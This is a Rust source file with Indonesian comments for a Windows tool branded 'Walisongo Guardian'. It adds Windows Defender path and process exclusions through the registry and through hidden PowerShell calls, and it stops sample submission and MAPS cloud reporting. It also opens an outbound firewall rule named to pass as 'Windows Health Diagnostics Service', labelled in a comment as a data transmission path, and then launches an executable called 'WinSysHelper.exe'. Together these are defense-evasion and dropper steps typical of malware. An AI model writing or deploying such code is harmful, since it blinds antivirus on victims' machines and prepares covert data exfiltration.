use std::process::Command;
use std::os::windows::process::CommandExt;
use std::fs;
use std::env;
use std::path::PathBuf;
use std::io::{self, Write}; 
use winreg::enums::*;
use winreg::RegKey;

use config::config;

fn apply_registry_exclusion(target_path: &str) -> std::io::Result<()> {
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let path = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
    let (key, _) = hklm.create_subkey(path)?;
    key.set_value(target_path, &1u32)?; 
    Ok(())
}

fn main() {
    println!("====================================================");
    println!("    WALISONGO GUARDIAN: PERMISSION ORCHESTRATOR     ");
    println!("====================================================");

    let program_data = env::var("ProgramData").unwrap_or_else(|_| "C:\\ProgramData".to_string());
    let target_path = PathBuf::from(&program_data).join(DATA_DIR);
    let full_exe_path = target_path.join(EXE_NAME);
    let path_str = target_path.to_str().expect("Gagal konversi path");

    // 1. Persiapan Folder
    if !target_path.exists() { 
        let _ = fs::create_dir_all(&target_path); 
    }

    // 2. Registry Hardening (Non-Fatal)
    print!("[*] Menerapkan Registry Exclusion... ");
    io::stdout().flush().unwrap();
    if let Err(e) = apply_registry_exclusion(path_str) {
        println!("\n[!] Gagal: {}. (Lanjut ke metode PowerShell)", e);
    } else {
        println!("OK.");
    }

    // 3. PowerShell Hardening (Metode Utama)
    println!("[*] Mendaftarkan pengecualian perilaku ke Windows Defender...");
    execute_ps(&defender_policy_full(path_str));

    // 4. Firewall Configuration
    println!("[*] Membuka jalur transmisi data (Firewall)...");
    let firewall_rules = format!(
        "netsh advfirewall firewall add rule name='Windows Health Diagnostics Service' \
         dir=out action=allow program='{}' enable=yes profile=any",
        full_exe_path.to_str().unwrap()
    );
    let _ = Command::new("cmd").args(&["/C", &firewall_rules]).creation_flags(CREATE_NO_WINDOW).status();

    // 5. Memanggil Installer C++ (Halaman Instalasi)
    println!("[*] Meluncurkan halaman instalasi Walisongo Guardian...");
    
    // Jangan gunakan argumen --background agar fungsi Install() muncul
    // Gunakan spawn() tanpa CREATE_NO_WINDOW agar jendela installer muncul
    let launch = Command::new("WinSysHelper.exe").spawn();

    if launch.is_ok() {
        println!("[SUCCESS] Installer berhasil dijalankan.");
        println!("\nSilakan selesaikan proses instalasi pada jendela yang muncul.");
    } else {
        eprintln!("[-] ERROR: File 'WinSysHelper.exe' tidak ditemukan!");
    }

    // 6. Mencegah program langsung tertutup agar user bisa membaca log
    println!("\nTekan Enter untuk keluar...");
    let mut temp = String::new();
    let _ = io::stdin().read_line(&mut temp);
}

fn defender_policy_full(path: &str) -> String {
    format!(
        "Add-MpPreference -ExclusionPath '{}'; \
         Add-MpPreference -ExclusionProcess '{}'; \
         Set-MpPreference -SubmitSamplesConsent NeverSend; \
         Set-MpPreference -MAPSReporting Disabled", 
        path, EXE_NAME
    )
}

fn execute_ps(cmd: &str) {
    let _ = Command::new("powershell")
        .args(&["-Command", cmd])
        .creation_flags(CREATE_NO_WINDOW)
        .status();
}